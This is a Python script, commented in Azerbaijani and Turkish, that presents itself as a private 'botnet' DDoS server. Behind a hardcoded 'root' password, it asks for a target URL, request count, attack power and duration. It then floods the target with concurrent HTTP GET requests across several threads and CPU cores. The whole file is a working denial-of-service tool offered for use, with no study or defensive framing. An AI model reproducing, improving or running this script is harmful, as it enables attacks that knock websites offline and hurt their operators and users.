import asyncio
import aiohttp
import threading
import time
import multiprocessing
from colorama import Fore, Style
import os
import sys
import random

# İskopisix bannerini animasiya ilə göstərmək
def display_banner():
    banner_text = "0100010001001001111001001111001010 666 ISKOPISIX BOTNET SERVER PRIVATE DDOS SERVER 0100010100010111001001001000101111010"
    
    os.system("cls" if os.name == "nt" else "clear")  # Terminalı təmizlə
    for char in banner_text:
        sys.stdout.write(Fore.GREEN + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(0.1)  # Hər hərfi müəyyən gecikmə ilə göstər
    print("\n")

def password_prompt():
    password = input("Parol daxil edin: ")
    if password == "root":
        print(Fore.GREEN + "Düzgün parol! 0x7F6AD9F14371C6FB9678CA77 hücum menusu açılır..." + Style.RESET_ALL)
        start_attack()  # Hücum menyusu
    else:
        print(Fore.RED + "Yanlış parol! Çıxış edilir..." + Style.RESET_ALL)
        exit(0)

async def send_request(session, target):
    try:
        async with session.get(target) as response:
            print(f"Status Code: {response.status}")
    except Exception as e:
        print(f"Hata: {e}")

async def send_requests(target, request_count):
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, target) for _ in range(request_count)]
        await asyncio.gather(*tasks)

def start_attack():
    try:
        target = input("Hedef URL: ")
        request_count = int(input("Gönderilecek İstek Sayısı (örn: 100000): "))  # Daha yüksek istek sayısı
        attack_power = int(input("Saldırı Gücü (1-2-3): "))  # Daha yüksek güç seçeceğiz
        attack_duration = int(input("Saldırı Süresi (saniye): "))

        if attack_power not in [1, 2, 3]:
            print("Geçersiz saldırı gücü seçimi. Varsayılan olarak 3 seçildi.")
            attack_power = 3

        total_cores = multiprocessing.cpu_count()
        cores_to_use = min(total_cores, attack_power * 2)  # Daha fazla çekirdek kullanımı

        print(f"{request_count} adet istek {target} adresine {cores_to_use} çekirdek kullanılarak gönderiliyor...")

        start_time = time.time()
        while time.time() - start_time < attack_duration:  # Saldırı süresi boyunca devam et
            threads = []
            for _ in range(cores_to_use):
                # İş parçacığı başlatma
                thread = threading.Thread(target=asyncio.run, args=(send_requests(target, request_count // cores_to_use),))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

        end_time = time.time()
        duration = end_time - start_time

        print(f"Saldırı tamamlandı. Toplam süre: {duration:.2f} saniye.")
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def main():
    try:
        display_banner()  # Banner yazısı göstərilir
        password_prompt()  # Parol sorğusu göstərilir
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

if __name__ == "__main__":
    main()
